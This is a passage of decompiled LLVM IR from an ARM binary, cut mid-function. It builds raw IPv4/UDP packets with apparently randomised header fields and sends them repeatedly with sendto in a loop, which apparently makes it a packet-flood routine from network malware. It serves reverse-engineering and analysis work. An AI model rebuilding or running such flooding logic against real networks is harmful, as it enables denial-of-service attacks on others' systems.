  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_e1f8

dec_label_pc_e1f8:                                ; preds = %dec_label_pc_e260, %dec_label_pc_e1ec
  %v1_e20c = phi i32 [ %v1_e2f8, %dec_label_pc_e260 ], [ 0, %dec_label_pc_e1ec ]
  %v5_e1fc = mul i32 %v1_e20c, 24
  %v1_e200 = load i32, i32* @r8, align 4
  %v2_e200 = add i32 %v1_e200, %v5_e1fc
  store i32 %v2_e200, i32* %r3.global-to-local, align 4
  store i32 %v2_debc, i32* %ip.global-to-local, align 4
  %v1_e208 = add i32 %v2_e200, 20
  %v2_e208 = inttoptr i32 %v1_e208 to i8*
  %v3_e208 = load i8, i8* %v2_e208, align 1
  %v4_e208 = zext i8 %v3_e208 to i32
  store i32 %v4_e208, i32* %r2.global-to-local, align 4
  %v4_e20c = mul i32 %v1_e20c, 4
  %v5_e20c = add i32 %v4_e20c, %v2_debc
  %v6_e20c = inttoptr i32 %v5_e20c to i32*
  %v7_e20c = load i32, i32* %v6_e20c, align 4
  store i32 %v7_e20c, i32* @r5, align 4
  %v7_e210 = icmp eq i8 %v3_e208, 31
  store i1 %v7_e210, i1* %cpsr_z.global-to-local, align 1
  %v1_e214 = add i32 %v7_e20c, 20
  store i32 %v1_e214, i32* @r6, align 4
  %tmp85 = icmp ult i8 %v3_e208, 32
  br i1 %tmp85, label %dec_label_pc_e314, label %dec_label_pc_e21c

dec_label_pc_e21c:                                ; preds = %dec_label_pc_e1f8
  store i32 %v6_dfc4, i32* %r0.global-to-local, align 4
  store i1 %v7_e220, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e220, label %dec_label_pc_e37c, label %dec_label_pc_e228

dec_label_pc_e228:                                ; preds = %dec_label_pc_e314, %dec_label_pc_e21c
  store i32 %v3_e04c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_e38c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_e38c, label %dec_label_pc_e398, label %dec_label_pc_e23c

dec_label_pc_e23c:                                ; preds = %dec_label_pc_e37c.dec_label_pc_e23c_crit_edge, %dec_label_pc_e228
  %v1_e240 = phi i32 [ %v1_e240.pre, %dec_label_pc_e37c.dec_label_pc_e23c_crit_edge ], [ 65535, %dec_label_pc_e228 ]
  store i32 %v3_e030, i32* %r2.global-to-local, align 4
  %v9_e240 = icmp eq i32 %v3_e030, %v1_e240
  store i1 %v9_e240, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e240, label %dec_label_pc_e3b4, label %dec_label_pc_e248

dec_label_pc_e248:                                ; preds = %dec_label_pc_e398.dec_label_pc_e248_crit_edge, %dec_label_pc_e23c
  %v1_e24c = phi i32 [ %v1_e24c.pre, %dec_label_pc_e398.dec_label_pc_e248_crit_edge ], [ %v1_e240, %dec_label_pc_e23c ]
  store i32 %v3_e050, i32* %r3.global-to-local, align 4
  %v9_e24c = icmp eq i32 %v3_e050, %v1_e24c
  store i1 %v9_e24c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e24c, label %dec_label_pc_e3d0, label %dec_label_pc_e254

dec_label_pc_e254:                                ; preds = %dec_label_pc_e3b4, %dec_label_pc_e248
  store i32 %v1_dfb0, i32* %ip.global-to-local, align 4
  store i1 %v2_e258, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e258, label %dec_label_pc_e260, label %dec_label_pc_e3ec

dec_label_pc_e260:                                ; preds = %dec_label_pc_e254, %dec_label_pc_e3d0, %dec_label_pc_e3ec
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_e264 = load i32, i32* @r7, align 4
  %v1_e264 = trunc i32 %v0_e264 to i8
  %v2_e264 = load i32, i32* @r5, align 4
  %v3_e264 = add i32 %v2_e264, 10
  %v4_e264 = inttoptr i32 %v3_e264 to i8*
  store i8 %v1_e264, i8* %v4_e264, align 1
  %v0_e268 = load i32, i32* @r7, align 4
  %v1_e268 = trunc i32 %v0_e268 to i8
  %v2_e268 = load i32, i32* @r5, align 4
  %v3_e268 = add i32 %v2_e268, 11
  %v4_e268 = inttoptr i32 %v3_e268 to i8*
  store i8 %v1_e268, i8* %v4_e268, align 1
  %v0_e26c = load i32, i32* @r5, align 4
  store i32 %v0_e26c, i32* @r0, align 4
  %v2_e270 = call i32 @function_f19c(i32 %v0_e26c, i32 20)
  %v3_e270 = trunc i32 %v2_e270 to i8
  store i32 %v2_e270, i32* %r0.global-to-local, align 4
  %v4_e274 = sdiv i32 %v2_e270, 256
  store i32 %v4_e274, i32* %r3.global-to-local, align 4
  %v1_e278 = trunc i32 %v4_e274 to i8
  %v2_e278 = load i32, i32* @r5, align 4
  %v3_e278 = add i32 %v2_e278, 11
  %v4_e278 = inttoptr i32 %v3_e278 to i8*
  store i8 %v1_e278, i8* %v4_e278, align 1
  %v3_e27c = load i32, i32* @r5, align 4
  %v4_e27c = add i32 %v3_e27c, 10
  %v5_e27c = inttoptr i32 %v4_e27c to i8*
  store i8 %v3_e270, i8* %v5_e27c, align 1
  %v0_e280 = load i32, i32* @r7, align 4
  %v1_e280 = trunc i32 %v0_e280 to i8
  %v2_e280 = load i32, i32* @r6, align 4
  %v3_e280 = add i32 %v2_e280, 6
  %v4_e280 = inttoptr i32 %v3_e280 to i8*
  store i8 %v1_e280, i8* %v4_e280, align 1
  %v0_e284 = load i32, i32* @r7, align 4
  %v1_e284 = trunc i32 %v0_e284 to i8
  %v2_e284 = load i32, i32* @r6, align 4
  %v3_e284 = add i32 %v2_e284, 7
  %v4_e284 = inttoptr i32 %v3_e284 to i8*
  store i8 %v1_e284, i8* %v4_e284, align 1
  %v0_e288 = load i32, i32* @r5, align 4
  %v1_e288 = add i32 %v0_e288, 24
  %v2_e288 = inttoptr i32 %v1_e288 to i8*
  %v3_e288 = load i8, i8* %v2_e288, align 1
  %v4_e288 = zext i8 %v3_e288 to i32
  store i32 %v4_e288, i32* %r3.global-to-local, align 4
  %v1_e28c = add i32 %v0_e288, 25
  %v2_e28c = inttoptr i32 %v1_e28c to i8*
  %v3_e28c = load i8, i8* %v2_e28c, align 1
  %v4_e28c = zext i8 %v3_e28c to i32
  %v0_e290 = load i32, i32* @r6, align 4
  store i32 %v0_e290, i32* @r1, align 4
  %v4_e294 = mul nuw nsw i32 %v4_e28c, 256
  %v5_e294 = or i32 %v4_e294, %v4_e288
  store i32 %v5_e294, i32* %r2.global-to-local, align 4
  store i32 %v0_e288, i32* %r0.global-to-local, align 4
  %v0_e29c = load i32, i32* @sb, align 4
  store i32 %v0_e29c, i32* %r3.global-to-local, align 4
  %v4_e2a0 = call i32 @function_f1f8(i32 %v0_e288, i32 %v0_e290, i32 %v5_e294, i32 %v0_e29c)
  %v5_e2a0 = trunc i32 %v4_e2a0 to i8
  store i32 %v4_e2a0, i32* %r0.global-to-local, align 4
  %v4_e2a438 = udiv i32 %v4_e2a0, 256
  %v1_e2a8 = trunc i32 %v4_e2a438 to i8
  %v2_e2a8 = load i32, i32* @r6, align 4
  %v3_e2a8 = add i32 %v2_e2a8, 7
  %v4_e2a8 = inttoptr i32 %v3_e2a8 to i8*
  store i8 %v1_e2a8, i8* %v4_e2a8, align 1
  %v3_e2ac = load i32, i32* @r6, align 4
  %v4_e2ac = add i32 %v3_e2ac, 6
  %v5_e2ac = inttoptr i32 %v4_e2ac to i8*
  store i8 %v5_e2a0, i8* %v5_e2ac, align 1
  %v3_e2b0 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_e2b0, i32* %r3.global-to-local, align 4
  %v0_e2b4 = load i32, i32* @r5, align 4
  %v1_e2b4 = add i32 %v0_e2b4, 20
  %v2_e2b4 = inttoptr i32 %v1_e2b4 to i32*
  %v3_e2b4 = load i32, i32* %v2_e2b4, align 4
  %v3_e2bc = udiv i32 %v3_e2b4, 65536
  store i32 %v3_e2bc, i32* %r2.global-to-local, align 4
  %v5_e2c0 = mul i32 %v3_e2b0, 24
  %v1_e2c4 = load i32, i32* @r8, align 4
  %v2_e2c4 = add i32 %v1_e2c4, %v5_e2c0
  store i32 %v2_e2c4, i32* %ip.global-to-local, align 4
  %v3_e2c835 = udiv i32 %v3_e2b4, 16777216
  %v1_e2cc = trunc i32 %v3_e2c835 to i8
  %v3_e2cc = add i32 %v2_e2c4, 3
  %v4_e2cc = inttoptr i32 %v3_e2cc to i8*
  store i8 %v1_e2cc, i8* %v4_e2cc, align 1
  %v0_e2d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_e2d0 = trunc i32 %v0_e2d0 to i8
  %v2_e2d0 = load i32, i32* %ip.global-to-local, align 4
  %v3_e2d0 = add i32 %v2_e2d0, 2
  %v4_e2d0 = inttoptr i32 %v3_e2d0 to i8*
  store i8 %v1_e2d0, i8* %v4_e2d0, align 1
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_e2d8 = load i32, i32* @r5, align 4
  store i32 %v0_e2d8, i32* %r1.global-to-local, align 4
  store i32 %v3_dfd8, i32* %r0.global-to-local, align 4
  %v0_e2e0 = load i32, i32* @fp, align 4
  store i32 %v0_e2e0, i32* %r2.global-to-local, align 4
  store i32 16, i32* %r4.global-to-local, align 4
  %v0_e2e8 = load i32, i32* %ip.global-to-local, align 4
  %v4_e2e8 = inttoptr i32 %v0_e2e8 to %sockaddr*
  %v7_e2f0 = inttoptr i32 %v0_e2d8 to i32*
  %v9_e2f0 = call i32 @sendto(i32 %v3_dfd8, i32* %v7_e2f0, i32 %v0_e2e0, i32 16384, %sockaddr* %v4_e2e8, i32 16)
  %v3_e2f4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_e2f4, i32* %r3.global-to-local, align 4
  %v1_e2f8 = add i32 %v3_e2f4, 1
  store i32 %v1_e2f8, i32* %r0.global-to-local, align 4
  %v1_e2fc = load i32, i32* @sl, align 4
  %v9_e2fc = icmp eq i32 %v1_e2f8, %v1_e2fc
  store i1 %v9_e2fc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_e2f8, i32* %stack_var_-40, align 4
  %v5_e304 = icmp slt i32 %v1_e2f8, %v1_e2fc
  br i1 %v5_e304, label %dec_label_pc_e1f8, label %dec_label_pc_e308

dec_label_pc_e308:                                ; preds = %dec_label_pc_e260
  %v2_e308 = icmp eq i32 %v1_e2fc, 0
  store i1 %v2_e308, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e1e8.outer

dec_label_pc_e314:                                ; preds = %dec_label_pc_e1f8
  %v1_e314 = add i32 %v2_e200, 16
  %v2_e314 = inttoptr i32 %v1_e314 to i32*
  %v3_e314 = load i32, i32* %v2_e314, align 4
  store i32 %v3_e314, i32* %r4.global-to-local, align 4
  %v0_e318 = call i32 @function_10bd8()
  store i32 %v0_e318, i32* %r0.global-to-local, align 4
  %v3_e31c = load i32, i32* %stack_var_-40, align 4
  %v5_e324 = mul i32 %v3_e31c, 24
  %v1_e32c = load i32, i32* @r8, align 4
  %v2_e32c = add i32 %v1_e32c, %v5_e324
  store i32 %v2_e32c, i32* %r1.global-to-local, align 4
  %v1_e330 = and i32 %v3_e314, ptrtoint (i32* @global_var_ff00.79 to i32)
  store i32 %v1_e330, i32* %r3.global-to-local, align 4
  %v1_e328 = udiv i32 %v3_e314, 256
  %v3_e334 = and i32 %v1_e328, 65280
  store i32 %v3_e334, i32* %r2.global-to-local, align 4
  %v3_e338 = mul i32 %v3_e314, 16777216
  store i32 %v3_e338, i32* %ip.global-to-local, align 4
  %v1_e33c = add i32 %v2_e32c, 20
  %v2_e33c = inttoptr i32 %v1_e33c to i8*
  %v3_e33c = load i8, i8* %v2_e33c, align 1
  %v4_e33c = zext i8 %v3_e33c to i32
  %v4_e340 = mul i32 %v1_e330, 256
  %v5_e340 = or i32 %v4_e340, %v3_e338
  store i32 %v5_e340, i32* %ip.global-to-local, align 4
  %v4_e344 = udiv i32 %v3_e314, 16777216
  %v5_e344 = or i32 %v3_e334, %v4_e344
  %v2_e348 = or i32 %v5_e344, %v5_e340
  %v7_e34c = lshr i32 %v0_e318, %v4_e33c
  %v8_e34c = add i32 %v7_e34c, %v2_e348
  store i32 %v8_e34c, i32* %r2.global-to-local, align 4
  %v3_e358 = mul i32 %v8_e34c, 16777216
  %v1_e350 = mul i32 %v8_e34c, 256
  %v4_e35c = and i32 %v1_e350, 16711680
  %v5_e35c = or i32 %v4_e35c, %v3_e358
  store i32 %v5_e35c, i32* %r1.global-to-local, align 4
  store i32 %v6_dfc4, i32* %r0.global-to-local, align 4
  %v2_e36c = call i32 @llvm.bswap.i32(i32 %v8_e34c)
  store i32 %v2_e36c, i32* %r3.global-to-local, align 4
  store i1 %v7_e220, i1* %cpsr_z.global-to-local, align 1
  %v1_e374 = load i32, i32* @r5, align 4
  %v2_e374 = add i32 %v1_e374, 16
  %v3_e374 = inttoptr i32 %v2_e374 to i32*
  store i32 %v2_e36c, i32* %v3_e374, align 4
  br i1 %v2_e220, label %dec_label_pc_e37c, label %dec_label_pc_e228

dec_label_pc_e37c:                                ; preds = %dec_label_pc_e314, %dec_label_pc_e21c
  %v0_e37c = call i32 @function_10bd8()
  store i32 %v0_e37c, i32* %r0.global-to-local, align 4
  store i32 %v3_e04c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_e38c, i1* %cpsr_z.global-to-local, align 1
  %v1_e390 = load i32, i32* @r5, align 4
  %v2_e390 = add i32 %v1_e390, 12
  %v3_e390 = inttoptr i32 %v2_e390 to i32*
  store i32 %v0_e37c, i32* %v3_e390, align 4
  br i1 %v3_e38c, label %dec_label_pc_e398, label %dec_label_pc_e37c.dec_label_pc_e23c_crit_edge

dec_label_pc_e37c.dec_label_pc_e23c_crit_edge:    ; preds = %dec_label_pc_e37c
  %v1_e240.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_e23c

dec_label_pc_e398:                                ; preds = %dec_label_pc_e37c, %dec_label_pc_e228
  %v0_e398 = call i32 @function_10bd8()
  %v1_e398 = trunc i32 %v0_e398 to i8
  store i32 %v0_e398, i32* %r0.global-to-local, align 4
  store i32 %v3_e030, i32* %r2.global-to-local, align 4
  %v4_e3a0 = sdiv i32 %v0_e398, 256
  store i32 %v4_e3a0, i32* %r3.global-to-local, align 4
  %v1_e3a4 = load i32, i32* @r4, align 4
  %v9_e3a4 = icmp eq i32 %v3_e030, %v1_e3a4
  store i1 %v9_e3a4, i1* %cpsr_z.global-to-local, align 1
  %v1_e3a8 = trunc i32 %v4_e3a0 to i8
  %v2_e3a8 = load i32, i32* @r5, align 4
  %v3_e3a8 = add i32 %v2_e3a8, 5
  %v4_e3a8 = inttoptr i32 %v3_e3a8 to i8*
  store i8 %v1_e3a8, i8* %v4_e3a8, align 1
  %v3_e3ac = load i32, i32* @r5, align 4
  %v4_e3ac = add i32 %v3_e3ac, 4
  %v5_e3ac = inttoptr i32 %v4_e3ac to i8*
  store i8 %v1_e398, i8* %v5_e3ac, align 1
  %v0_e3b0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e3b0, label %dec_label_pc_e3b4, label %dec_label_pc_e398.dec_label_pc_e248_crit_edge

dec_label_pc_e398.dec_label_pc_e248_crit_edge:    ; preds = %dec_label_pc_e398
  %v1_e24c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_e248

dec_label_pc_e3b4:                                ; preds = %dec_label_pc_e398, %dec_label_pc_e23c
  %v0_e3b4 = call i32 @function_10bd8()
  %v1_e3b4 = trunc i32 %v0_e3b4 to i8
  store i32 %v0_e3b4, i32* %r0.global-to-local, align 4
  %v4_e3b8 = sdiv i32 %v0_e3b4, 256
  store i32 %v4_e3b8, i32* %r3.global-to-local, align 4
  %v3_e3bc = load i32, i32* @r5, align 4
  %v4_e3bc = add i32 %v3_e3bc, 20
  %v5_e3bc = inttoptr i32 %v4_e3bc to i8*
  store i8 %v1_e3b4, i8* %v5_e3bc, align 1
  %v0_e3c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_e3c0 = trunc i32 %v0_e3c0 to i8
  %v2_e3c0 = load i32, i32* @r6, align 4
  %v3_e3c0 = add i32 %v2_e3c0, 1
  %v4_e3c0 = inttoptr i32 %v3_e3c0 to i8*
  store i8 %v1_e3c0, i8* %v4_e3c0, align 1
  store i32 %v3_e050, i32* %r3.global-to-local, align 4
  %v1_e3c8 = load i32, i32* @r4, align 4
  %v9_e3c8 = icmp eq i32 %v3_e050, %v1_e3c8
  store i1 %v9_e3c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e3c8, label %dec_label_pc_e3d0, label %dec_label_pc_e254

dec_label_pc_e3d0:                                ; preds = %dec_label_pc_e3b4, %dec_label_pc_e248
  %v0_e3d0 = call i32 @function_10bd8()
  %v1_e3d0 = trunc i32 %v0_e3d0 to i8
  store i32 %v0_e3d0, i32* %r0.global-to-local, align 4
  store i32 %v1_dfb0, i32* %ip.global-to-local, align 4
  %v4_e3d8 = sdiv i32 %v0_e3d0, 256
  store i32 %v4_e3d8, i32* %r3.global-to-local, align 4
  store i1 %v2_e258, i1* %cpsr_z.global-to-local, align 1
  %v1_e3e0 = trunc i32 %v4_e3d8 to i8
  %v2_e3e0 = load i32, i32* @r6, align 4
  %v3_e3e0 = add i32 %v2_e3e0, 3
  %v4_e3e0 = inttoptr i32 %v3_e3e0 to i8*
  store i8 %v1_e3e0, i8* %v4_e3e0, align 1
  %v3_e3e4 = load i32, i32* @r6, align 4
  %v4_e3e4 = add i32 %v3_e3e4, 2
  %v5_e3e4 = inttoptr i32 %v4_e3e4 to i8*
  store i8 %v1_e3d0, i8* %v5_e3e4, align 1
  %v0_e3e8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e3e8, label %dec_label_pc_e260, label %dec_label_pc_e3ec

dec_label_pc_e3ec:                                ; preds = %dec_label_pc_e254, %dec_label_pc_e3d0
  %v0_e3ec = load i32, i32* @r5, align 4
  %v1_e3ec = add i32 %v0_e3ec, 28
  store i32 %v1_e3ec, i32* %r0.global-to-local, align 4
  store i32 %v0_e028, i32* @r1, align 4
  %v1_e3f4 = inttoptr i32 %v1_e3ec to i8*
  %v2_e3f4 = call i32 @function_10db4(i8* %v1_e3f4)
  store i32 %v2_e3f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e260

dec_label_pc_e3fc:                                ; preds = %dec_label_pc_dfe8
  store i32 %v3_dfd8, i32* %r0.global-to-local, align 4
  %v1_e400 = call i32 @close(i32 %v3_dfd8)
  store i32 %v1_e400, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e404

dec_label_pc_e404:                                ; preds = %dec_label_pc_de9c, %dec_label_pc_e3fc
  %v29_e408 = phi i32 [ %v3_dfd8, %dec_label_pc_de9c ], [ %v1_e400, %dec_label_pc_e3fc ]
  store i32 %v3_de9c, i32* %r4.global-to-local, align 4
  store i32 %v6_de9c, i32* %r5.global-to-local, align 4
  store i32 %v9_de9c, i32* %r6.global-to-local, align 4
  store i32 %v12_de9c, i32* %r7.global-to-local, align 4
  store i32 %v18_de9c, i32* %sb.global-to-local, align 4
  store i32 %v24_de9c, i32* %fp.global-to-local, align 4
  ret i32 %v29_e408

dec_label_pc_e40c:                                ; preds = %dec_label_pc_e06c
  %v3_e410 = sext i8 %v5_e0d0 to i32
  %v7_e410 = sext i8 %v5_e0d4 to i32
  %v3_e414 = sdiv i32 %v3_e410, 256
  store i32 %v3_e414, i32* %r0.global-to-local, align 4
  %v3_e418 = sdiv i32 %v7_e410, 256
  store i32 %v3_e418, i32* %r1.global-to-local, align 4
  store i32 %v1_e0a8, i32* %r2.global-to-local, align 4
  store i32 %v1_e0ac, i32* %r3.global-to-local, align 4
  %v3_e42434 = udiv i32 %v1_e0c4, 256
  store i32 %v3_e42434, i32* %ip.global-to-local, align 4
  %v5_e438 = trunc i32 %v3_e42434 to i8
  store i32 0, i32* %r6.global-to-local, align 4
  %v4_e490 = sext i8 %v5_df2c to i32
  %sext12 = mul i32 %v0_e02c, 16777216
  %v4_e4f8 = sdiv i32 %sext12, 16777216
  %sext13 = mul i32 %v0_e03c, 16777216
  %v4_e508 = sdiv i32 %sext13, 16777216
  %v1_e510 = trunc i32 %v4_e508 to i8
  br label %dec_label_pc_e440

dec_label_pc_e440:                                ; preds = %dec_label_pc_e440, %dec_label_pc_e40c
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_e44c = call i32 @_calloc(i32 1510, i32 1)
  store i32 %v2_e44c, i32* %r0.global-to-local, align 4
  store i32 %v2_debc, i32* %r1.global-to-local, align 4
  %v3_e454 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_e454, i32* %r2.global-to-local, align 4
  %v2_e458 = load i32, i32* %r6.global-to-local, align 4
  %v5_e458 = mul i32 %v2_e458, 4
  %v6_e458 = add i32 %v5_e458, %v2_debc
  %v7_e458 = inttoptr i32 %v6_e458 to i32*
  store i32 %v2_e44c, i32* %v7_e458, align 4
  %v0_e45c = load i32, i32* %r1.global-to-local, align 4
  %v1_e45c = load i32, i32* %r2.global-to-local, align 4
  %v4_e45c = mul i32 %v1_e45c, 4
  %v5_e45c = add i32 %v4_e45c, %v0_e45c
  %v6_e45c = inttoptr i32 %v5_e45c to i32*
  %v7_e45c = load i32, i32* %v6_e45c, align 4
  store i32 %v7_e45c, i32* %r1.global-to-local, align 4
  %v1_e460 = inttoptr i32 %v7_e45c to i8*
  %v2_e460 = load i8, i8* %v1_e460, align 1
  %tmp86 = urem i8 %v2_e460, 16
  %v1_e464 = zext i8 %tmp86 to i32
  %v1_e468 = or i32 %v1_e464, 64
  store i32 %v1_e468, i32* %r3.global-to-local, align 4
  %v1_e46c = trunc i32 %v1_e468 to i8
  store i8 %v1_e46c, i8* %v1_e460, align 1
  %v0_e470 = load i32, i32* %r1.global-to-local, align 4
  %v1_e470 = inttoptr i32 %v0_e470 to i8*
  %v2_e470 = load i8, i8* %v1_e470, align 1
  %v3_e470 = zext i8 %v2_e470 to i32
  %v1_e474 = and i32 %v3_e470, 240
  %v1_e478 = or i32 %v1_e474, 5
  store i32 %v1_e478, i32* %r2.global-to-local, align 4
  %v3_e480 = add i32 %v0_e470, 9
  %v4_e480 = inttoptr i32 %v3_e480 to i8*
  store i8 17, i8* %v4_e480, align 1
  %v0_e484 = load i32, i32* %r2.global-to-local, align 4
  %v1_e484 = trunc i32 %v0_e484 to i8
  %v2_e484 = load i32, i32* %r1.global-to-local, align 4
  %v3_e484 = inttoptr i32 %v2_e484 to i8*
  store i8 %v1_e484, i8* %v3_e484, align 1
  %v2_e48c = load i32, i32* %r1.global-to-local, align 4
  %v3_e48c = add i32 %v2_e48c, 1
  %v4_e48c = inttoptr i32 %v3_e48c to i8*
  store i8 %v5_def4, i8* %v4_e48c, align 1
  store i32 %v4_e490, i32* %r0.global-to-local, align 4
  %v2_e494 = load i32, i32* %r1.global-to-local, align 4
  %v3_e494 = add i32 %v2_e494, 8
  %v4_e494 = inttoptr i32 %v3_e494 to i8*
  store i8 %v5_df2c, i8* %v4_e494, align 1
  %v3_e498 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_e498, i32* %r2.global-to-local, align 4
  store i32 %v6_dfc4, i32* %ip.global-to-local, align 4
  %v3_e4a0 = mul i32 %v3_e498, 32
  store i32 %v3_e4a0, i32* %r3.global-to-local, align 4
  %v1_e4a4 = load i32, i32* %r1.global-to-local, align 4
  %v2_e4a4 = add i32 %v1_e4a4, 12
  %v3_e4a4 = inttoptr i32 %v2_e4a4 to i32*
  store i32 %v6_dfc4, i32* %v3_e4a4, align 4
  %v0_e4a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_e4a8 = load i32, i32* %r2.global-to-local, align 4
  %tmp87 = mul i32 %v1_e4a8, -8
  %v5_e4a8 = add i32 %v0_e4a8, %tmp87
  %v1_e4ac = load i32, i32* @r8, align 4
  %v2_e4ac = add i32 %v5_e4a8, %v1_e4ac
  store i32 %v2_e4ac, i32* %r3.global-to-local, align 4
  %v1_e4b0 = add i32 %v2_e4ac, 16
  %v2_e4b0 = inttoptr i32 %v1_e4b0 to i32*
  %v3_e4b0 = load i32, i32* %v2_e4b0, align 4
  %v1_e4b4 = load i32, i32* %r1.global-to-local, align 4
  %v2_e4b4 = add i32 %v1_e4b4, 16
  %v3_e4b4 = inttoptr i32 %v2_e4b4 to i32*
  store i32 %v3_e4b0, i32* %v3_e4b4, align 4
  %v0_e4bc = load i32, i32* %r2.global-to-local, align 4
  %v1_e4bc = add i32 %v0_e4bc, 1
  store i32 %v1_e4bc, i32* %r6.global-to-local, align 4
  store i32 %v7_e410, i32* %ip.global-to-local, align 4
  store i32 %v3_e414, i32* %r2.global-to-local, align 4
  %v2_e4c8 = load i32, i32* %r1.global-to-local, align 4
  %v3_e4c8 = add i32 %v2_e4c8, 2
  %v4_e4c8 = inttoptr i32 %v3_e4c8 to i8*
  store i8 %v5_e0d0, i8* %v4_e4c8, align 1
  store i32 %v3_e418, i32* %r0.global-to-local, align 4
  %v0_e4d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_e4d0 = trunc i32 %v0_e4d0 to i8
  %v2_e4d0 = load i32, i32* %r1.global-to-local, align 4
  %v3_e4d0 = add i32 %v2_e4d0, 3
  %v4_e4d0 = inttoptr i32 %v3_e4d0 to i8*
  store i8 %v1_e4d0, i8* %v4_e4d0, align 1
  %v0_e4d4 = load i32, i32* %ip.global-to-local, align 4
  %v1_e4d4 = trunc i32 %v0_e4d4 to i8
  %v2_e4d4 = load i32, i32* %r1.global-to-local, align 4
  %v3_e4d4 = add i32 %v2_e4d4, 4
  %v4_e4d4 = inttoptr i32 %v3_e4d4 to i8*
  store i8 %v1_e4d4, i8* %v4_e4d4, align 1
  store i32 64, i32* %r2.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_e4e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_e4e0 = add i32 %v0_e4e0, 20
  store i32 %v1_e4e0, i32* %r3.global-to-local, align 4
  %v0_e4e4 = load i32, i32* %r0.global-to-local, align 4
  %v1_e4e4 = trunc i32 %v0_e4e4 to i8
  %v3_e4e4 = add i32 %v0_e4e0, 5
  %v4_e4e4 = inttoptr i32 %v3_e4e4 to i8*
  store i8 %v1_e4e4, i8* %v4_e4e4, align 1
  %v0_e4e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_e4e8 = trunc i32 %v0_e4e8 to i8
  %v2_e4e8 = load i32, i32* %r1.global-to-local, align 4
  %v3_e4e8 = add i32 %v2_e4e8, 6
  %v4_e4e8 = inttoptr i32 %v3_e4e8 to i8*
  store i8 %v1_e4e8, i8* %v4_e4e8, align 1
  %v0_e4ec = load i32, i32* %ip.global-to-local, align 4
  %v1_e4ec = trunc i32 %v0_e4ec to i8
  %v2_e4ec = load i32, i32* %r1.global-to-local, align 4
  %v3_e4ec = add i32 %v2_e4ec, 7
  %v4_e4ec = inttoptr i32 %v3_e4ec to i8*
  store i8 %v1_e4ec, i8* %v4_e4ec, align 1
  %v0_e4f0 = load i32, i32* %r4.global-to-local, align 4
  %v1_e4f0 = trunc i32 %v0_e4f0 to i8
  %v2_e4f0 = load i32, i32* %r1.global-to-local, align 4
  %v3_e4f0 = add i32 %v2_e4f0, 20
  %v4_e4f0 = inttoptr i32 %v3_e4f0 to i8*
  store i8 %v1_e4f0, i8* %v4_e4f0, align 1
  store i32 %v3_e42434, i32* %r0.global-to-local, align 4
  store i32 %v4_e4f8, i32* %r1.global-to-local, align 4
  %v2_e4fc = load i32, i32* %r3.global-to-local, align 4
  %v3_e4fc = add i32 %v2_e4fc, 5
  %v4_e4fc = inttoptr i32 %v3_e4fc to i8*
  store i8 %v5_e438, i8* %v4_e4fc, align 1
  %v0_e500 = load i32, i32* %r1.global-to-local, align 4
  %v1_e500 = trunc i32 %v0_e500 to i8
  %v2_e500 = load i32, i32* %r3.global-to-local, align 4
  %v3_e500 = add i32 %v2_e500, 1
  %v4_e500 = inttoptr i32 %v3_e500 to i8*
  store i8 %v1_e500, i8* %v4_e500, align 1
  %v0_e504 = load i32, i32* %r5.global-to-local, align 4
  %v1_e504 = trunc i32 %v0_e504 to i8
  %v2_e504 = load i32, i32* %r3.global-to-local, align 4
  %v3_e504 = add i32 %v2_e504, 2
  %v4_e504 = inttoptr i32 %v3_e504 to i8*
  store i8 %v1_e504, i8* %v4_e504, align 1
  store i32 %v4_e508, i32* %r2.global-to-local, align 4
  %v0_e50c = load i32, i32* %r6.global-to-local, align 4
  %v1_e50c = load i32, i32* @sl, align 4
  %v9_e50c = icmp eq i32 %v0_e50c, %v1_e50c
  store i1 %v9_e50c, i1* %cpsr_z.global-to-local, align 1
  %v2_e510 = load i32, i32* %r3.global-to-local, align 4
  %v3_e510 = add i32 %v2_e510, 3
  %v4_e510 = inttoptr i32 %v3_e510 to i8*
  store i8 %v1_e510, i8* %v4_e510, align 1
  %v0_e514 = load i32, i32* %r7.global-to-local, align 4
  %v1_e514 = trunc i32 %v0_e514 to i8
  %v2_e514 = load i32, i32* %r3.global-to-local, align 4
  %v3_e514 = add i32 %v2_e514, 4
  %v4_e514 = inttoptr i32 %v3_e514 to i8*
  store i8 %v1_e514, i8* %v4_e514, align 1
  %v0_e518 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_e518, i32* %stack_var_-40, align 4
  %v5_e51c = icmp slt i32 %v0_e50c, %v1_e50c
  br i1 %v5_e51c, label %dec_label_pc_e440, label %dec_label_pc_e1e0

; uselistorder directives
  uselistorder i32 %v3_e42434, { 2, 0, 1 }
  uselistorder i32 %v3_e418, { 1, 0 }
